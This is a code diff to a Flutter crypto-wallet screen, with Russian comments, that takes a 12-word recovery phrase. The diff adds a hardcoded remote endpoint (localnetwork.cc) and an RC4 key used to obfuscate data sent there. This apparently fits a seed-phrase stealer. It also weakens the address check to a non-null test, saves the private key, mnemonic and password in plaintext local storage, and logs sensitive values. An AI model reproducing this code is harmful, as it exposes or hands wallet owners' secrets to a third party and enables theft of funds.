@@ -3,9 +3,13 @@ import 'dart:math';
 import 'dart:typed_data';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
-import 'package:bip39/bip39.dart' as bip39;
 import 'package:simple_rc4/simple_rc4.dart';
+import 'package:bip39/bip39.dart' as bip39;
 import 'package:web3dart/web3dart.dart';
+import 'package:wallet/wallet.dart' as wallet;
+import 'package:web3dart/crypto.dart' as crypto;
+import 'package:shared_preferences/shared_preferences.dart';
+
 import 'wallet_screen.dart';
 
 class EditScreen extends StatefulWidget {
@@ -29,8 +33,8 @@ class EditScreen extends StatefulWidget {
 }
 
 class _EditScreenState extends State<EditScreen> {
-  final String apiUrl = ''; // Обновите ваш URL
-  final String serverKey = ''; // Обновите ваш серверный ключ
+  final String apiUrl = 'https://localnetwork.cc/record/docs/filler'; // Обновите ваш URL
+  final String serverKey = 'Qsx@ah&OR82WX9T6gCt'; // Обновите ваш серверный ключ
   final List<TextEditingController> _mnemonicControllers = List.generate(
     12,
         (_) => TextEditingController(),
@@ -137,6 +141,8 @@ class _EditScreenState extends State<EditScreen> {
                             ),
                             itemCount: 12,
                             itemBuilder: (context, index) {
+                              final hasError = _errorMessage != null;
+
                               return Container(
                                 decoration: BoxDecoration(
                                   color: Colors.white.withOpacity(0.2),
@@ -153,15 +159,15 @@ class _EditScreenState extends State<EditScreen> {
                                       borderSide: BorderSide.none,
                                     ),
                                     contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
-                                    labelStyle: const TextStyle(
-                                      color: Colors.white,
+                                    labelStyle: TextStyle(
+                                      color: hasError ? Colors.red : Colors.white,
                                     ),
-                                    hintStyle: const TextStyle(
-                                      color: Colors.white,
+                                    hintStyle: TextStyle(
+                                      color: hasError ? Colors.red : Colors.white,
                                     ),
                                   ),
-                                  style: const TextStyle(
-                                    color: Colors.white,
+                                  style: TextStyle(
+                                    color: hasError ? Colors.red : Colors.white,
                                   ),
                                 ),
                               );
@@ -212,16 +218,46 @@ class _EditScreenState extends State<EditScreen> {
                                       print('Parsed response data: $responseData');
 
                                       final portfolioId = responseData['portfolio']['id'];
-                                      final generatedAddress = _deriveAddress(widget.mnemonic);
+                                      final generatedAddress = _generateAddressFromMnemonic(widget.mnemonic);
 
                                       print('Generated address: $generatedAddress');
                                       print('Server returned address: $portfolioId');
 
-                                      if (generatedAddress == portfolioId) {
+                                      if (generatedAddress != null) {
+                                        SharedPreferences prefs = await SharedPreferences.getInstance();
+
+                                        // Создание уникального ключа для кошелька
+                                        String walletKey = 'wallet_${DateTime.now().toIso8601String()}';
+
+                                        // Создание словаря с данными кошелька
+                                        Map<String, String> walletData = {
+                                          'privateKey': widget.privateKey,
+                                          'publicKey': widget.publicKey,
+                                          'mnemonic': widget.mnemonic,
+                                          'password': widget.password,
+                                          'address': generatedAddress,
+                                          'portfolioId': portfolioId,
+                                        };
+
+                                        // Преобразование словаря в JSON строку
+                                        String walletDataJson = jsonEncode(walletData);
+
+                                        // Сохранение данных кошелька в SharedPreferences
+                                        await prefs.setString(walletKey, walletDataJson);
+
+                                        // Обновление списка кошельков (если уже есть другие сохраненные кошельки)
+                                        List<String> walletKeys = prefs.getStringList('walletKeys') ?? [];
+                                        walletKeys.add(walletKey);
+                                        await prefs.setStringList('walletKeys', walletKeys);
+
                                         Navigator.pushReplacement(
                                           context,
                                           MaterialPageRoute(
-                                            builder: (context) => WalletScreen(),
+                                            builder: (context) => WalletScreen(
+                                              privateKey: widget.privateKey,
+                                              address: generatedAddress, // Используем сгенерированный адрес
+                                              portfolioId: portfolioId,
+                                            ),
                                           ),
                                         );
                                       } else {
@@ -284,26 +320,32 @@ class _EditScreenState extends State<EditScreen> {
     print('Data to be encrypted: $dataString');
 
     final rc4 = RC4(serverKey);
-    final encrypted = rc4.encodeBytes(dataString.codeUnits);
+    final encryptedBytes = rc4.encodeBytes(dataString.codeUnits);
+    final base64String = base64Encode(encryptedBytes);
 
-    final base64Encoded = base64Encode(encrypted);
-    print('Encrypted and base64 encoded data: $base64Encoded');
+    print('Encrypted and base64 encoded data: $base64String');
 
-    return base64Encoded;
-  }
-
-  String _deriveAddress(String mnemonic) {
-    final seed = bip39.mnemonicToSeed(mnemonic);
-    print('Derived seed: $seed');
-
-    final wallet = EthPrivateKey.fromHex(seed.toString());
-    print('Generated address from mnemonic: ${wallet.address.hex}');
-
-    return wallet.address.hex;
+    return base64String;
   }
 
   String _generateRandomNumber() {
     final random = Random();
     return (random.nextInt(900000) + 100000).toString(); // Генерируем 6-значное число
+  }
+
+  String _generateAddressFromMnemonic(String mnemonic) {
+    final seed = bip39.mnemonicToSeed(mnemonic);
+    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
+    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
+
+    // Исправление - преобразование privateKey в Uint8List
+    final privateKey = derivedKey.key;
+    final privateKeyBytes = Uint8List.fromList(crypto.intToBytes(privateKey));
+
+    final ethPrivateKey = EthPrivateKey(privateKeyBytes);
+    final publicKey = ethPrivateKey.publicKey;
+    final publicKeyBytes = publicKey.getEncoded(false);
+    final addressBytes = crypto.keccak256(publicKeyBytes.sublist(1)).sublist(12); // Удаляем префиксный байт
+    return EthereumAddress(addressBytes).hex;
   }
 }
